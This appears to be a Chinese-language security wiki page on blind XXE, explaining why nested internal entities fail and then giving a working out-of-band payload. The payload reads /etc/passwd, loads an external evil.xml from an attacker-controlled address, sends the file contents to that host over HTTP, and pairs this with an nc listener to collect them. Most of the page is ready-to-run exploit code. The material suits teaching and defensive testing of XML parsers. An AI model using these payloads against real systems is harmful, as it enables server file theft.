### Blind XXE 原理

带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。

直接在内部实体定义中引用另一个实体的方法如下，但是这种方法行不通。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % param1 "file:///c:/1.txt">
<!ENTITY % param2 "http://127.0.0.1/?%param1">
%param2;
]>

```

于是考虑内部实体嵌套的形式：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % param1 "file:///c:/1.txt">
<!ENTITY % param2 "<!ENTITY % param222 SYSTEM'http://127.0.0.1/?%param1;'>">
%param2;
]>
<root>

```

但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。

![](images/security_wiki/15906401372631.png)


##### 解决方案是：

将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。

如下：

payload

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % remote SYSTEM "http://192.168.100.1/evil.xml">
%remote;
%all;
]>

```

【evil.xml】

```xml
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://192.168.100.1/?file=%file;'>">

```

nc -lvv port 监听即可获得请求回显内容

